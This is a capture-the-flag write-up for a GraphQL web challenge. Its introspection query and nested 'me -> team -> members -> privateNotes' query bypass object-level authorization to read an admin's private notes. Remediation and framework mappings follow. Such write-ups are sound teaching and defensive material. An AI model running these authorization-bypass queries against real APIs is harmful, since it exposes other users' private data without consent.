# The Shape of Query

**Category:** Web
**Challenge:** The Shape of Query
**CTF:** Pointer Overflow CTF 2026
**Points:** 97 (WEB 300, Wave 1)
**Result:** Solved

**Flag:**

~~~text
poctf{...}
~~~

---

## 1. Reconnaissance

The challenge provides a GraphQL API at `shape-of-query.pointeroverflowctf.com`. After exchanging the session token at `/session/exchange`, the API becomes accessible at `/graphql`.

The first step was running an introspection query to map the full schema:

~~~graphql
{
  __schema {
    types {
      name
      fields {
        name
        type { name kind ofType { name } }
      }
    }
  }
}
~~~

This revealed two main types:

| Type | Fields |
|---|---|
| User | id, username, role, team, privateNotes |
| Team | id, name, members |

Two query entry points existed:

- `user(id: String!)` : direct lookup by ID
- `me` : returns the current authenticated user

---

## 2. Identifying the Vulnerability

Direct access to the admin user was denied:

~~~graphql
{ user(id: "admin_1391") { privateNotes } }
~~~

Response: authorization error. The `user()` query enforced object-level access control.

However, the schema showed that `User.team` returns a `Team` object, and `Team.members` returns a list of `User` objects. This creates an alternative traversal path:

~~~text
me -> team -> members -> [all users including admin] -> privateNotes
~~~

This is a classic **Broken Object Level Authorization (BOLA)** vulnerability: the direct path is protected but the nested relationship path is not.

---

## 3. Exploitation

The exploit query:

~~~graphql
{
  me {
    team {
      members {
        id
        username
        role
        privateNotes
      }
    }
  }
}
~~~

This returned all team members including `admin_1391`, whose `privateNotes` field contained the flag:

~~~json
{
  "id": "admin_1391",
  "username": "admin",
  "role": "admin",
  "privateNotes": "poctf{...}"
}
~~~

---

## 4. Attack Path Summary

~~~text
Exchange session token at /session/exchange
    -> session cookie
    |
GraphQL introspection at /graphql
    -> User {id, username, role, team, privateNotes}
    -> Team {id, name, members}
    |
Direct lookup user(id:"admin_1391") -> denied (BOLA)
    |
Nested path: me -> team -> members -> privateNotes
    -> admin_1391.privateNotes = poctf{...}
~~~

---

## 5. Lessons Learned

| # | Finding | Key Takeaway |
|---|---|---|
| 1 | Direct user lookup was protected but nested traversal was not | Authorization must be enforced at every resolution point, not just top-level queries |
| 2 | Introspection was fully enabled | Disable or restrict introspection in production GraphQL APIs |
| 3 | privateNotes exposed through relationship traversal | Sensitive fields need field-level authorization, not just query-level |
| 4 | Session token expires in 15 minutes | Time-boxed sessions add operational friction but also limit attack windows |

---

## 6. MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|-------|--------|-----------|--------|
| Reconnaissance | TA0043 | Active Scanning: Vulnerability Scanning (introspection query) | T1595.002 |
| Initial Access | TA0001 | Exploit Public-Facing Application | T1190 |
| Discovery | TA0007 | Account Discovery: Local Account | T1087.001 |
| Collection | TA0009 | Data from Information Repositories | T1213 |
| Lateral Movement | TA0008 | Exploitation of Remote Services (nested relationship traversal) | T1210 |

---

## 7. Remediation and Containment

### Technical Fixes

1. Disable GraphQL introspection in production environments or restrict it to authenticated admin roles
2. Enforce field-level authorization on sensitive fields (`privateNotes`) at every resolver, not just top-level queries
3. Implement query depth limiting and complexity analysis to prevent deeply nested relationship traversal
4. Add rate limiting to the GraphQL endpoint to slow down schema enumeration

### OWASP Top 10

- **A01:2021 Broken Access Control:** direct user lookup was protected, but the nested `me -> team -> members -> privateNotes` path was not; authorization was inconsistent across resolution paths
- **A04:2021 Insecure Design:** the schema exposed sensitive fields through relationship traversal without field-level guards

### OWASP API Security Top 10

- **API1:2023 Broken Object Level Authorization (BOLA):** the nested `Team.members` relationship bypassed the object-level access control enforced on the `user()` query
- **API3:2023 Broken Object Property Level Authorization:** `privateNotes` was returned for all users via the nested path without per-field authorization

### MITRE D3FEND Countermeasures

- **D3-ACL (Access Control List):** enforce authorization at every GraphQL resolver, not just entry-point queries
- **D3-IOPR (IO Port Restriction):** limit API surface area by disabling introspection and restricting exposed fields
- **D3-AL (Authorization Logging):** log all GraphQL queries and flag nested traversal patterns reaching sensitive fields

### NIST CSF 2.0

- **Protect (PR.AA):** enforce consistent authorization across all API access paths, including nested relationships
- **Protect (PR.DS):** protect sensitive data fields with per-resolver access control
- **Detect (DE.CM):** monitor GraphQL query patterns for introspection attempts and deep nested traversals

### NIST SP 800-53 Rev. 5

- **AC-3 (Access Enforcement):** enforce authorization decisions at every resolution point in the query graph
- **AC-4 (Information Flow Enforcement):** control information flow through nested object relationships
- **AC-6 (Least Privilege):** expose only the minimum required fields per user role
- **SI-11 (Error Handling):** return generic errors for unauthorized access attempts to avoid leaking schema information

### C2M2

- **Domain:** ACCESS (Identity and Access Management)
- **Practice:** Enforce authorization at all API endpoints and data access paths
- **Target MIL:** MIL-2

---

Thanks guys!! (❍ᴥ❍ʋ)

---

GraphQL is a goldmine for pentesters who know where to dig. If you found this introspection walkthrough useful, share it on your timeline and let's connect.

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
